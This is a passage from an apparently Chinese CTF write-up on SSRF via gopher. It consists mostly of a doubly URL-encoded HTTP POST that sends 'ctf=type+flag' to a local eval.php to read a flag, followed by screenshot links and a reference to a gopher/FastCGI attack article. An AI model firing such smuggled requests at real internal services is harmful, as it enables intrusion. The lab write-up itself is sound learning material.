%2536%250a%2541%2563%2563%2565%2570%2574%253a%2520%2574%2565%2578%2574%252f%2568%2574%256d%256c%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%2568%2574%256d%256c%252b%2578%256d%256c%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%256d%256c%253b%2571%253d%2530%252e%2539%252c%2569%256d%2561%2567%2565%252f%2577%2565%2562%2570%252c%2569%256d%2561%2567%2565%252f%2561%2570%256e%2567%252c%252a%252f%252a%253b%2571%253d%2530%252e%2538%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2573%2569%2567%256e%2565%2564%252d%2565%2578%2563%2568%2561%256e%2567%2565%253b%2576%253d%2562%2533%250a%2552%2565%2566%2565%2572%2565%2572%253a%2520%2568%2574%2574%2570%253a%252f%252f%2531%2532%2537%252e%2530%252e%2530%252e%2531%252f%2573%2573%2572%2566%256d%2565%252f%2570%256f%2573%2574%252f%2565%2576%2561%256c%252e%2570%2568%2570%250a%2541%2563%2563%2565%2570%2574%252d%2545%256e%2563%256f%2564%2569%256e%2567%253a%2520%2567%257a%2569%2570%252c%2520%2564%2565%2566%256c%2561%2574%2565%250a%2541%2563%2563%2565%2570%2574%252d%254c%2561%256e%2567%2575%2561%2567%2565%253a%2520%257a%2568%252d%2543%254e%252c%257a%2568%253b%2571%253d%2530%252e%2539%250a%2543%256f%256f%256b%2569%2565%253a%2520%2553%254c%255f%2547%255f%2557%2550%2554%255f%2554%254f%253d%257a%2568%253b%2520%2553%254c%255f%2547%2557%2550%2554%255f%2553%2568%256f%2577%255f%2548%2569%2564%2565%255f%2574%256d%2570%253d%2531%253b%2520%2553%254c%255f%2577%2570%2574%2547%256c%256f%2562%2554%2569%2570%2554%256d%2570%253d%2531%250a%2543%256f%256e%256e%2565%2563%2574%2569%256f%256e%253a%2520%2563%256c%256f%2573%2565%250a%250a%2563%2574%2566%253d%2574%2579%2570%2565%252b%2566%256c%2561%2567

```

url 直接访问即可，curl 如下  
![](https://img-blog.csdnimg.cn/20191113210304201.png)  
![](https://img-blog.csdnimg.cn/20191113210910438.png)

参考：https://blog.chaitin.cn/gopher-attack-surfaces/#h2.3\_%E6%94%BB%E5%87%BB-fastcgi